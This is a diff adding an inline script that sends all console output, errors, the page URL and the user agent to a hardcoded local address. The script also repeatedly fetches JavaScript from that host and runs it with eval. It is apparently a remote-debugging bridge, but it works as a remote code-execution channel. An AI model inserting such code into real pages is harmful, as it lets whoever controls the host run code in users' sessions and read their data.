@@ -1,0 +1,14 @@
+<script>
+(function(){var B='http://192.168.1.98:5321';
+function post(p,o){var body;try{body=JSON.stringify(o)}catch(e){body=JSON.stringify({id:o&&o.id,ok:false,error:'unserializable:'+String(o&&o.value)})}
+try{fetch(B+p,{method:'POST',headers:{'content-type':'application/json'},body:body}).catch(function(){})}catch(e){}}
+['log','warn','error','info'].forEach(function(l){var o=console[l].bind(console);console[l]=function(){o.apply(console,arguments);post('/log',{level:l,t:Date.now(),args:Array.prototype.slice.call(arguments).map(function(a){try{return typeof a==='string'?a:JSON.stringify(a)}catch(e){return String(a)}})})}});
+window.addEventListener('error',function(e){post('/log',{level:'uncaught',t:Date.now(),args:[String(e.message)]})});
+window.addEventListener('unhandledrejection',function(e){post('/log',{level:'unhandledrejection',t:Date.now(),args:[String(e.reason&&e.reason.stack||e.reason)]})});
+post('/log',{level:'hello',t:Date.now(),args:[location.href,navigator.userAgent]});
+var busy=false;function done(){busy=false;setTimeout(poll,300)}
+function poll(){if(busy){setTimeout(poll,500);return}busy=true;fetch(B+'/next').then(function(r){return r.status===200?r.json():null}).then(function(cmd){if(!cmd){busy=false;setTimeout(poll,700);return}
+try{var v=(0,eval)(cmd.code);Promise.resolve(v).then(function(val){post('/result',{id:cmd.id,ok:true,value:val===undefined?null:val,t:Date.now()});done()},function(err){post('/result',{id:cmd.id,ok:false,error:String(err&&err.stack||err),t:Date.now()});done()})}
+catch(e){post('/result',{id:cmd.id,ok:false,error:String(e&&e.stack||e),t:Date.now()});done()}}).catch(function(){busy=false;setTimeout(poll,1500)})}
+setTimeout(poll,1500)})();
+</script>
